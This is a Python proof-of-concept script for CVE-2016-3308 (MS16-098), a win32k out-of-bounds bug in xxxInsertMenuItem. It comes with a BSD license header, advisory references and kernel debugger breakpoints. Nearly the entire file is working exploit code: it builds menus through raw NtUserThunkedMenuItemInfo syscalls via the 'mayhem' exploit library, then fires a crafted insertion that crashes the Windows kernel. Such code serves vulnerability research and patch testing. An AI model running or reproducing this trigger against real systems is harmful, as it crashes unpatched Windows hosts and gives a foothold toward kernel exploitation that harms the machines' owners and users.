#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  ms16_098_bsod.py
#
#  Copyright 2016 Spencer McIntyre <zeroSteiner@gmail.com>
#
#  Redistribution and use in source and binary forms, with or without
#  modification, are permitted provided that the following conditions are
#  met:
#
#  * Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
#  * Redistributions in binary form must reproduce the above
#    copyright notice, this list of conditions and the following disclaimer
#    in the documentation and/or other materials provided with the
#    distribution.
#  * Neither the name of the  nor the names of its
#    contributors may be used to endorse or promote products derived from
#    this software without specific prior written permission.
#
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
#  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
#  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
#  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
#  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
#  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
#  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
#  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
#  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
#  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#

"""
References:
  - http://www.zerodayinitiative.com/advisories/ZDI-16-453/
  - http://j00ru.vexillium.org/?p=2105
  - https://msdn.microsoft.com/en-us/library/windows/desktop/ms647578(v=vs.85).aspx

Useful breakpoints:
  - win32k!NtUserThunkedMenuItemInfo
  - win32k!xxxInsertMenuItem
  - win32k!xxxInsertMenuItem+0x10c
  - win32k!xxxInsertMenuItem+0x188
  - win32k!xxxInsertMenuItem+0x195
  - win32k!xxxInsertMenuItem+0x1aa ".printf \"rbx = 0x%p, [rsp+0x90] = 0x%p\\n\", rbx, poi(rsp+0x90)"
  - win32k!xxxInsertMenuItem+0x2ec
"""

MF_POPUP = 0x0010
MF_STRING = 0x0000
MFS_ENABLED = 0x0000
MFT_STRING = 0x0000

MIIM_BITMAP = 0x0080
MIIM_ID = 0x0002
MIIM_STRING = 0x0040
MIIM_SUBMENU = 0x0004

HBMMENU_SYSTEM = 1

import ctypes
import os
import platform
import random
import sys
import time

lib_path = os.path.split(__file__)[0]
lib_path = os.path.join(lib_path, '..')
lib_path = os.path.abspath(lib_path)
sys.path.insert(0, lib_path)
from mayhem.datatypes.windows import MENUITEMINFOW
from mayhem.datatypes.windows import UNICODE_STRING
from mayhem.exploit.windows import WindowsSyscall
from mayhem.exploit.windows import error_on_null
from mayhem.exploit.windows import print_handle

user32 = ctypes.windll.user32

syscall = WindowsSyscall()

def add_submenu_item(h_menu, name, w_id=None):
	h_submenu = user32.CreatePopupMenu()

	mi_info = MENUITEMINFOW()
	mi_info.cbSize = ctypes.sizeof(MENUITEMINFOW)
	mi_info.fMask = MIIM_STRING | MIIM_SUBMENU | MIIM_ID | MIIM_BITMAP
	mi_info.fState = MFS_ENABLED
	mi_info.hSubMenu = h_submenu
	mi_info.wID = random.randint(0x10, 0xff) if w_id is None else w_id
	mi_info.dwTypeData = name
	mi_info.hbmpItem = HBMMENU_SYSTEM  # (required to set nPosition to 1 in trigger)

	item = UNICODE_STRING.from_string(name)

	result = error_on_null(syscall.NtUserThunkedMenuItemInfo(
		h_menu,                 # HMENU hMenu
		0,                      # UINT  nPosition
		False,                  # BOOL  fByPosition
		True,                   # BOOL  fInsert
		ctypes.byref(mi_info),  # LPMENUITEMINFOW lpmii
		ctypes.byref(item)      # PUNICODE_STRING pstrItem
	))
	print("NtUserThunkedMenuItemInfo submenu result: 0x{0:08x}".format(result))
	return h_submenu

def add_menu_item(h_menu, name, w_id=None):
	mi_info = MENUITEMINFOW()
	mi_info.cbSize = ctypes.sizeof(MENUITEMINFOW)
	mi_info.fMask = MIIM_STRING | MIIM_ID
	mi_info.fType = MFT_STRING
	mi_info.fState = MFS_ENABLED
	mi_info.wID = random.randint(0x1000, 0xffff) if w_id is None else w_id

	item = UNICODE_STRING.from_string(name)

	result = error_on_null(syscall.NtUserThunkedMenuItemInfo(
		h_menu,                 # HMENU hMenu
		-1,                     # UINT  nPosition
		True,                   # BOOL  fByPosition
		True,                   # BOOL  fInsert
		ctypes.byref(mi_info),  # LPMENUITEMINFOW lpmii
		ctypes.byref(item)      # PUNICODE_STRING pstrItem
	))
	print("    mi_info->wID = 0x{0:04x}".format(mi_info.wID))
	return result

def trigger(h_menu, name, w_id, n_position, f_by_position):
	mi_info = MENUITEMINFOW()
	mi_info.cbSize = ctypes.sizeof(MENUITEMINFOW)
	mi_info.fMask = MIIM_STRING | MIIM_ID
	mi_info.fType = MFT_STRING
	mi_info.fState = MFS_ENABLED
	mi_info.wID = w_id

	item = UNICODE_STRING.from_string(name)

	result = error_on_null(syscall.NtUserThunkedMenuItemInfo(
		h_menu,                 # HMENU hMenu
		n_position,             # UINT  nPosition
		f_by_position,          # BOOL  fByPosition
		True,                   # BOOL  fInsert
		ctypes.byref(mi_info),  # LPMENUITEMINFOW lpmii
		ctypes.byref(item)      # PUNICODE_STRING pstrItem
	))
	return result

def fill_menu(h_menu, base_idx=0x1000, count=7):
	for idx in range(0, count):
		print("[*] adding menu item #{0}".format(idx + 1))
		time.sleep(0.25)
		add_menu_item(h_menu, "menu item {0}".format(idx), w_id=(base_idx + idx))
	return

def main():
	print('**************************************************')
	print('* CVE-2016-3308 / MS16-098 / ZDI-16-453 BSOD     *')
	print('* win32k!xxxInsertMenuItem Out-of-Bounds Access  *')
	print('* Spencer (@zeroSteiner) McIntyre                *')
	print('**************************************************')

	if platform.architecture()[0] == '64bit':
		print("[*] x86-64 syscall:       0x{0:016x}".format(syscall.address))
	else:
		print("[*] x86 syscall:          0x{0:08x}".format(syscall.address))
	#raw_input("[*] PID: {0}, press enter to continue...".format(os.getpid()))

	h_menu = user32.CreateMenu()
	print("[*] h_menu:               0x{0:08x}".format(h_menu))
	print_handle(h_menu)

	h_submenu = add_submenu_item(h_menu, 'submenu', w_id=0x0123)
	print("[*] h_submenu:            0x{0:08x}".format(h_submenu))
	print_handle(h_submenu)
	add_menu_item(h_submenu, 'subsubmenu-item', w_id=0x0001)

	fill_menu(h_menu, base_idx=0x1001)

	print("[+] triggering...")
	time.sleep(0.5)
	trigger(h_menu, 'sploit', w_id=0, n_position=0x0123, f_by_position=False)
	return 0

main()
